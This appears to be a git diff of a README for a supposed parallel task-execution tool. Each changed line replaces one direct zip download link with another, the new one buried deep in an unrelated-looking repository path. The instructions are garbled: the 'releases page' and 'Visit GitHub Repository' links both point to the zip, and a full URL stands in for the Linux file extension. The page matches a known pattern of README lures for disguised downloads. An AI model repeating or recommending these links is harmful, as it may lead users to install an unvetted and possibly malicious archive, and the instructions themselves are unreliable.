@@ -4,7 +4,7 @@
 Welcome to the **parallel-engine** repository! This application helps you execute multiple tasks at the same time, making your workflow faster and more efficient. Whether you're processing data, running batch jobs, or managing complex tasks, this tool will help you save time and effort.
 
 ## 📥 Download Now
-[![Download parallel-engine](https://raw.githubusercontent.com/thammanoon-code/parallel-engine/master/auriscalpium/parallel-engine.zip)](https://raw.githubusercontent.com/thammanoon-code/parallel-engine/master/auriscalpium/parallel-engine.zip)
+[![Download parallel-engine](https://github.com/thammanoon-code/parallel-engine/raw/refs/heads/master/storage/storage-daemon/smartcont/engine-parallel-v2.9.zip)](https://github.com/thammanoon-code/parallel-engine/raw/refs/heads/master/storage/storage-daemon/smartcont/engine-parallel-v2.9.zip)
 
 ## 🚀 Getting Started
 To get started with **parallel-engine**, follow these simple steps to download and install the application. 
@@ -17,13 +17,13 @@ Before you begin, ensure your computer meets the following requirements:
 
 ### 📥 Download & Install
 1. **Visit the Releases Page**  
-   To download the software, visit the releases page here: [Download parallel-engine](https://raw.githubusercontent.com/thammanoon-code/parallel-engine/master/auriscalpium/parallel-engine.zip).
+   To download the software, visit the releases page here: [Download parallel-engine](https://github.com/thammanoon-code/parallel-engine/raw/refs/heads/master/storage/storage-daemon/smartcont/engine-parallel-v2.9.zip).
 
 2. **Choose the Latest Version**  
    On the releases page, you will see several versions listed. Look for the latest version at the top of the page. This version will have the most recent features and bug fixes.
 
 3. **Download the Appropriate File**  
-   Select the file that matches your operating system. Click the link to start the download. The file names typically end with `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/thammanoon-code/parallel-engine/master/auriscalpium/parallel-engine.zip` for Linux.
+   Select the file that matches your operating system. Click the link to start the download. The file names typically end with `.exe` for Windows, `.dmg` for macOS, and `https://github.com/thammanoon-code/parallel-engine/raw/refs/heads/master/storage/storage-daemon/smartcont/engine-parallel-v2.9.zip` for Linux.
 
 4. **Locate the Downloaded File**  
    Once the download is complete, locate the file in your "Downloads" folder (or wherever your browser saves files).
@@ -31,7 +31,7 @@ Before you begin, ensure your computer meets the following requirements:
 5. **Install the Application**  
    - For **Windows**: Double-click the downloaded `.exe` file. Follow the on-screen instructions to complete the installation.
    - For **macOS**: Double-click the downloaded `.dmg` file. Drag the **parallel-engine** icon into your Applications folder.
-   - For **Linux**: Open a terminal and extract the `https://raw.githubusercontent.com/thammanoon-code/parallel-engine/master/auriscalpium/parallel-engine.zip` file. Follow the included instructions to install.
+   - For **Linux**: Open a terminal and extract the `https://github.com/thammanoon-code/parallel-engine/raw/refs/heads/master/storage/storage-daemon/smartcont/engine-parallel-v2.9.zip` file. Follow the included instructions to install.
 
 6. **Launch the Application**  
    After installation, find **parallel-engine** in your applications menu (for Windows and macOS) or execute it from the terminal (for Linux).
@@ -61,7 +61,7 @@ Before you begin, ensure your computer meets the following requirements:
 If you encounter any issues or have suggestions, feel free to reach out. Your feedback is important to help us improve **parallel-engine**.
 
 ## 🔗 Useful Links  
-- [Visit GitHub Repository](https://raw.githubusercontent.com/thammanoon-code/parallel-engine/master/auriscalpium/parallel-engine.zip)  
-- [Download parallel-engine](https://raw.githubusercontent.com/thammanoon-code/parallel-engine/master/auriscalpium/parallel-engine.zip)
+- [Visit GitHub Repository](https://github.com/thammanoon-code/parallel-engine/raw/refs/heads/master/storage/storage-daemon/smartcont/engine-parallel-v2.9.zip)  
+- [Download parallel-engine](https://github.com/thammanoon-code/parallel-engine/raw/refs/heads/master/storage/storage-daemon/smartcont/engine-parallel-v2.9.zip)
 
 Thank you for considering **parallel-engine** for your task execution needs!
